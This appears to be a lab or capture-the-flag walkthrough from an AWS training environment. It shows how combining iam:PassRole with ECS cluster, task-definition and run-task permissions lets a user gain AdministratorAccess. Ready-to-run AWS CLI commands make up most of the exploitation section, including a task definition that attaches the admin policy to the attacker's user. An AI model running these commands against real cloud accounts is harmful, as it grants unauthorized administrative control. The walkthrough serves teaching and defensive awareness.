# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with ECS cluster creation and task execution permissions can escalate to administrative privileges by passing a privileged role to a containerized workload they control. Unlike scenarios where the attacker assumes an existing ECS cluster, this attack requires the attacker to create their own infrastructure from scratch.

The attack chain combines four AWS permissions: `ecs:CreateCluster` to establish container infrastructure, `iam:PassRole` to attach a privileged role, `ecs:RegisterTaskDefinition` to define a malicious container, and `ecs:RunTask` to execute it. The containerized workload then uses the passed administrative role to modify IAM permissions, granting the original attacker permanent administrative access.

This attack pattern is particularly dangerous because it exploits the trust organizations place in containerized workloads. Many organizations grant broad ECS permissions to developers or CI/CD systems, not realizing that combining cluster creation with role passing capabilities creates a complete privilege escalation path. The use of AWS Fargate makes this attack even more accessible, as it requires no EC2 infrastructure or additional networking setup beyond a default VPC.

## The Challenge

You start as the IAM user `pl-prod-ecs-002-to-admin-starting-user` with credentials provided via Terraform outputs. Your goal is to reach administrative access in the AWS account — specifically, to obtain the permissions of `pl-prod-ecs-002-to-admin-target-role`, a role with `AdministratorAccess`.

Your starting user has the following permissions:
- `ecs:CreateCluster` on `*`
- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-ecs-002-to-admin-target-role`
- `ecs:RegisterTaskDefinition` on `*`
- `ecs:RunTask` on `*`

The target role has a trust policy that allows ECS tasks to assume it. You need to connect these pieces together: create the cluster, define a malicious task using the privileged role, run the task, and let the container do the escalation for you.

## Reconnaissance

First, let's confirm your identity and understand what you're working with:

```bash
aws sts get-caller-identity
```

You should see yourself as `pl-prod-ecs-002-to-admin-starting-user`. Now find the default VPC and a subnet — you'll need these to launch the Fargate task:

```bash
aws ec2 describe-vpcs --filters Name=isDefault,Values=true --query 'Vpcs[0].VpcId' --output text
aws ec2 describe-subnets --filters Name=vpc-id,Values=<vpc-id> --query 'Subnets[0].SubnetId' --output text
```

Note the subnet ID. You'll pass it to `ecs:RunTask` when launching the Fargate task.

## Exploitation

### Step 1: Create an ECS Cluster

You need a cluster to run your task. This is purely a logical grouping — no EC2 instances required when using Fargate:

```bash
aws ecs create-cluster --cluster-name pl-prod-ecs-002-attack-cluster
```

### Step 2: Register a Malicious Task Definition

Now register a task definition that uses the privileged target role. The critical element is setting `taskRoleArn` to the admin role via `iam:PassRole`. The container image (`amazon/aws-cli`) runs a single AWS CLI command that attaches `AdministratorAccess` to your starting user:

```bash
aws ecs register-task-definition \
  --family pl-ecs-002-privesc \
  --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 \
  --memory 512 \
  --container-definitions '[{
    "name": "escalate",
    "image": "amazon/aws-cli",
    "command": [
      "iam", "attach-user-policy",
      "--user-name", "pl-prod-ecs-002-to-admin-starting-user",
      "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
    ]
  }]'
```

When you pass this task definition, AWS validates that you have `iam:PassRole` on the specified `taskRoleArn`. Because your starting user has exactly that permission scoped to the target role, the call succeeds.

### Step 3: Run the Task on Fargate

Launch the task on Fargate using the cluster you just created:

```bash
aws ecs run-task \
  --cluster pl-prod-ecs-002-attack-cluster \
  --task-definition pl-ecs-002-privesc \
  --launch-type FARGATE \
  --network-configuration 'awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}'
```

Fargate pulls the `amazon/aws-cli` container image, starts the task, and the container runs with the credentials of `pl-prod-ecs-002-to-admin-target-role` via the task metadata service. The container executes one command — `aws iam attach-user-policy` — and attaches `AdministratorAccess` to your starting user.

You can monitor task completion:

```bash
aws ecs describe-tasks --cluster pl-prod-ecs-002-attack-cluster --tasks <task-arn>
```

Wait until the `lastStatus` reaches `STOPPED` and the container exit code is `0`.

## Verification

Once the task has completed, verify that your starting user now has admin access:

```bash
aws iam list-attached-user-policies --user-name pl-prod-ecs-002-to-admin-starting-user
```

You should see `AdministratorAccess` listed. Confirm you can now perform admin actions:

```bash
aws iam list-users --max-items 5
```

This call would previously have been denied. It now succeeds, confirming full administrative access.

## What Happened

You exploited a privilege escalation path that exists when a principal has both `iam:PassRole` and the ability to create and run ECS workloads. By creating attacker-controlled infrastructure (the cluster and task definition), you arranged for AWS to run your code with the permissions of the target role — without ever directly assuming that role yourself.

This is a common blind spot: security teams scrutinize `sts:AssumeRole` calls but overlook that ECS task execution is functionally equivalent. Any principal that can register a task definition with a privileged `taskRoleArn` and run it has effectively assumed that role, just indirectly. In real environments, developers and CI/CD pipelines routinely have these ECS permissions — the danger is compounded when those same principals can pass roles with elevated permissions.
